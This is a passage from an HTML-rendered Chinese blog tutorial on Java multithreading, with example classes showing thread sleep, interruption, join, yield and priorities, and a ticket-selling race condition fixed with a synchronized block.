class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程的休眠</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">run</span> <span class="operator">=</span> ()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;、 x = &quot;</span> + x);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>); <span class="comment">//暂缓执行</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;num &lt; <span class="number">5</span>;num++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(run, <span class="string">&quot;线程对象 - &quot;</span> + num).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073824.jpg"                      alt="image-20220806172614645"                ></p><p>​    此时五个线程对象，并且这五个线程对象执行的方法体是相同的。</p><p>​    此时从程序执行的感觉来讲，就像是若干个线程一起进行了休眠然后一起进行了自动唤醒，但是实际上是有差别的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073827.jpg"                      alt="image-20220806172915726"                ></p><p>​    <strong>注意：对象进入run()方法，提示文字的输出，线程休眠都是有先有后进入的。所以不是同时休眠，也不是同时唤醒的，中间是有适当的延迟操作的。</strong></p><h4 id="线程中断"><a href="#线程中断" class="headerlink" title="线程中断"></a>线程中断</h4><p>​    在之前发现线程的休眠里面提供有一个中断异常，实际上就证明线程的休眠是可以被打断的，而这种打断肯定是由其他线程完成的，在Thread类里面提供有这种中断执行的处理方法：</p><p>​    ·判断线程是否被中断：public boolean isInterrupted();</p><p>​    ·中断线程执行：public void interrupt();</p><p>范例：观察线程中断操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程中断</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;*******72小时没睡需要睡觉&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">10000</span>);<span class="comment">//睡10s</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;敢打扰我睡觉打死你&quot;</span>);;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;********已经睡好了，可以出去了&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start(); <span class="comment">//开始睡</span></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (!thread.isInterrupted())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我偷偷的打扰你一下&quot;</span>);</span><br><span class="line">            thread.interrupt(); <span class="comment">//中断执行</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    所有正在执行的线程都是可以被中断的，中断线程必须进行异常的处理。</p><h4 id="线程强制运行"><a href="#线程强制运行" class="headerlink" title="线程强制运行"></a>线程强制运行</h4><p>​    所谓的线程的强制执行指的是当满足于某些条件之后，某一个线程对象可以一直独占资源一直到该线程的程序执行结束。</p><p>范例：观察一个没有强制执行的程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程强制运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;执行、x = &quot;</span> + x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;玩耍的线程&quot;</span>);</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【霸道的main线程】number = &quot;</span> + x);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073829.jpg"                      alt="image-20220807021804036"                ></p><p>​    这个时候的主线程和子线程都在交替执行着，但是如果说现在你希望主线程独占执行。那么就可以利用Thread类中的方法。</p><p>​    强制执行：public final void join() throws InterruptedException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程强制运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">mainThread</span> <span class="operator">=</span> Thread.currentThread(); <span class="comment">//获得主线程</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x == <span class="number">3</span>)&#123; <span class="comment">//现在霸道的线程要来了</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        mainThread.join(); <span class="comment">//霸道的线程先处理</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;执行、x = &quot;</span> + x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;玩耍的线程&quot;</span>);</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;【霸道的main线程】number = &quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73830.jpg"                      alt="image-20220807022402185"                ></p><p>​    在进行线程强制执行的时候一定要获取强制执行线程对象之后才可以执行join()调用。</p><h4 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h4><p>​    线程的礼让指的是将资源让出去让别的线程先执行。线程的礼让可以使用Thread中提供的方法：</p><p>​    礼让方法：public static void yield()</p><p>范例：使用礼让操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程礼让</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">mainThread</span> <span class="operator">=</span> Thread.currentThread(); <span class="comment">//获得主线程</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x % <span class="number">3</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                    Thread.yield(); <span class="comment">//线程礼让</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;玩耍的线程礼让执行&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;执行、x = &quot;</span> + x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;玩耍的线程&quot;</span>);</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;【霸道的main线程】number = &quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073832.jpg"                      alt="image-20220807023203622"                ></p><h4 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h4><p>​    从理论上来讲线程的优先级越高越有可能先执行（也越有可能先抢占到资源）。</p><p>​    在Thread类里面针对于优先级的操作提供有如下的两个处理方法：</p><p>​    1、设置优先级：public finial void setPriority(int newPriority);</p><p>​    2、获取优先级：public final int getPriority（）</p><p>​    在进行优先级定义的时候都是通过int 型的数字来完成的，而对于此数字的选择在Thread类里面就定义有三个常量：</p><p>​    1、最高优先级：public static final int MAX PRIORITY,10;</p><p>​    2、中等优先级：public static final int NORM PRIORITY,5;</p><p>​    3、最低优先级：public static final int MIN PRIORITY,1;</p><p>范例：观察优先级</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程优先级</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">run</span> <span class="operator">=</span> ()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;x&lt;<span class="number">10</span>;x++)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;执行。&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(run,<span class="string">&quot;线程对象A&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(run,<span class="string">&quot;线程对象B&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(run,<span class="string">&quot;线程对象C&quot;</span>);</span><br><span class="line">        threadA.setPriority(Thread.MIN_PRIORITY);</span><br><span class="line">        threadB.setPriority(Thread.MIN_PRIORITY);</span><br><span class="line">        threadC.setPriority(Thread.MAX_PRIORITY);</span><br><span class="line">        threadA.start();</span><br><span class="line">        threadB.start();</span><br><span class="line">        threadC.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    把C的优先级提高，C先执行的概率提高了。</p><p>​    主方法是一个主线程，那么主线程的优先级呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程优先级</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        System.out.println(Thread.currentThread().getPriority());<span class="comment">//5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    主线程是属于中等优先级，而默认创建的线程也是中等优先级。<strong>优先级高的可能先执行而不是绝对先执行。</strong></p><hr><h3 id="线程的同步与死锁"><a href="#线程的同步与死锁" class="headerlink" title="线程的同步与死锁"></a>线程的同步与死锁</h3><p>​    在多线程的处理之中，<strong>可以利用 Runnable 描述多个线程操作的资源，而  Thread 描述每一个线程对象，于是当多个线程访问同一资源的时候如果处理不当就会产生数据的错误操作</strong>。</p><h4 id="同步问题引出"><a href="#同步问题引出" class="headerlink" title="同步问题引出"></a>同步问题引出</h4><p>范例：实现卖票操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现卖票操作，同步问题引出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread5</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">//总票数10张</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;卖票,ticket = &quot;</span>+<span class="built_in">this</span>.ticket --);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;********票已经卖光了*********&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test12</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread5</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread5</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073833.jpg"                      alt="image-20220807161735644"                ></p><p>​    此时的程序将创建三个线程对象，并且这三个线程对象将进行5张票的出售。此时的程序在进行卖票处理的时候并没有任何的问题（假象），下面可以模拟一下卖票中的延迟操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现卖票操作，同步问题引出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread5</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">//总票数10张</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>); <span class="comment">//模拟网络延迟</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;卖票,ticket = &quot;</span>+<span class="built_in">this</span>.ticket --);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;********票已经卖光了*********&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test12</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread5</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread5</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073835.jpg"                      alt="image-20220807161849591"                ></p><p>​    这个时候追加了延迟问题就暴露出来了，而实际上这个问题一直都在。如下图所示</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073836.jpg"                      alt="image-20220807162443959"                ></p><h4 id="线程同步处理"><a href="#线程同步处理" class="headerlink" title="线程同步处理"></a>线程同步处理</h4><p>​    经过分析之后已经可以确认同步问题所产生的主要原因了，那么，下面就需要进行同步问题的解决，<strong>解决同步问题的关键是锁，指的是当某一个线程执行操作的时候，其它线程外面等待</strong>。</p><p>​    如果想解决这样的问题，就必须使用同步，<strong>所谓的同步就是指多个操作在同一个时间段内只能有一个线程进行，其他线程要等待此线程完成之后才可以继续执行</strong>。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073838.jpg"                      alt="image-20220807164403320"                ></p><p>​    如果要想在程序之中实现这把锁的功能，就可以使用synchronized关键字来实现，利用此关键字可以定义同步方法或同步代码块，在同步代码块的操作里面的代码只允许一个线程执行。</p><p>​    1、利用同步代码块进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(同步对象)&#123;</span><br><span class="line">  同步代码操作;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    一般要进行同步对象处理的时候可以采用当前对象 this 进行同步。</p><p>范例:利用同步代码块解决数据同步访问问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用同步代码块解决数据同步访问问题</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread6</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">//总票数10张</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123; <span class="comment">//每一次只允许一个线程进行访问</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>); <span class="comment">//模拟网络延迟</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;卖票,ticket = &quot;</span> + <span class="built_in">this</span>.ticket--);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;********票已经卖光了*********&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span 